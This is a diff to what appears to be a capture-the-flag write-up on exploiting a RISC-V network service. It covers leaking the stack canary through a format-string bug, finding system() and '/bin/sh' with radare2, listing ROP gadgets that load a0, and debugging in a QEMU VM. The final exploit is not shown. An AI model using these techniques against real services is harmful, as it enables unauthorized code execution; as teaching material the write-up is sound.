@@ -61,7 +61,7 @@ From the first output we can identify the following informations:
 - since the `%p` specifier is printing 8-bytes values, it means that the application is running on a 64-bit architecture.
 - we can identify the canary value because it always ends with a `\x00` character and in this case it's `0xf6d0049f13023b00`.
 - we leak some addresses that doesn't really make sense in a X86_64 architecture, such as `0x103aa`.
-- if we send the payload multiple times, we notices every time a different canary values, indicating that the application is restarted after each connection and it's likely exposed on the network by the [inetd](https://www.freebsd.org/cgi/man.cgi?inetd(8)) service.
+- if we send the payload multiple times, we notices every time different canary values, indicating that the application is restarted after each connection and it's likely exposed on the network by the [inetd](https://www.freebsd.org/cgi/man.cgi?inetd(8)) service.
 
 After discovering this _critical intel_, the next step is to convert this ability in a arbritary read primitive in order to be able to leak the binary from memory and proceed to static analysis.
 
@@ -345,7 +345,7 @@ In detail, the commands do the following:
 - `afn execve`: rename it to `execve`
 - `axt`: find x-refs to the `execve` function
 - `s 0x1539a`: seek to a specific call that we think to be the one in the `system` function
-- `pd 25`: disassemble the next 25 instructions to discover the beginning of this function
+- `pd 25`: disassemble the next 25 instructions to discover the beginning of this function since Radare2 is not able to understand to which function the gadget belongs to
 - `s 0x000153a2`: seek to it
 - `afn system`: rename the symbol to `system`
 
@@ -375,6 +375,27 @@ We now know that the `/bin/sh` string is located at the address `0x4ddc0`.
 We can use the following command to retrieve all the `a0` gadget available in the executable:
 
 ```text
+[0x000101f8]> "/ad/ *; *; *; ret"
+...
+0x0004b3bc   # 8: addi a4, a4, 8; mv a0, a4; sd a5, 0(a3); ret
+0x0004b640   # 8: li a0, 0; ret; ld a0, 0(a1); ret
+0x0004ba0e   # 8: ld s10, 32(sp); ld s11, 24(sp); addi sp, sp, 128; ret
+0x0004bc80   # 8: ld s4, 80(sp); ld s5, 72(sp); addi sp, sp, 128; ret
+0x0004c494   # 10: j 0x4c3d4; lw a5, 0(a0); bnez a5, 0x4c496; ret
+0x0004c918   # 8: addi a4, a4, 8; mv a0, a4; sd a5, 0(a3); ret
+0x0004cd28   # 8: ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret
+0x0004d538   # 8: ld s1, 8(sp); ld s2, 0(sp); addi sp, sp, 32; ret
+[0x000101f8]> "/ad/ *; *; *; ret" | grep 'ld a0'
+...
+0x00066ee8   # 2: ld a0, 280(sp)
+0x00066eea   # 2: ld a0, 88(sp)
+0x00066eec   # 2: ld a0, 280(sp)
+0x00066f0d   # 2: ld a0, 200(a0)
+0x00066f16   # 2: ld a0, 344(sp)
+0x000678b0   # 2: ld a0, 96(a1)
+0x00068216   # 2: ld a0, 0(s0)
+0x00068960   # 2: ld a0, 8(a2)
+0x00068afd   # 2: ld a0, 8(s0)
 [0x000101f8]> "/ad/ *; *; *; ret" | grep 'ld a0' | cut -d',' -f2 | sort -nr | uniq | grep sp
 ...
  112(sp)
@@ -440,7 +461,7 @@ qemu-system-riscv64 \
 ```
 
 We will be able to login via SSH locally on port 1234 as `root:riscv`.
-Here we can install GDB and debug the binary to get the correct offset for the gadget and confirm that we correctly identified the `system(3)` function by putting a breakpoint or stepping after sending the `hack` string that will execute `system("/bin/cat /qemu/arnold")` in order to print the executable on _stdout_.
+Here we can install GDB and debug the binary to get the correct offset for the gadget and confirm that we correctly identified the `system(3)` function by putting a breakpoint or stepping after sending the `hack` string that will execute `system("/bin/cat /qemu/arnold")` in order to print the executable to _stdout_.
 
 ## Final Exploit
 
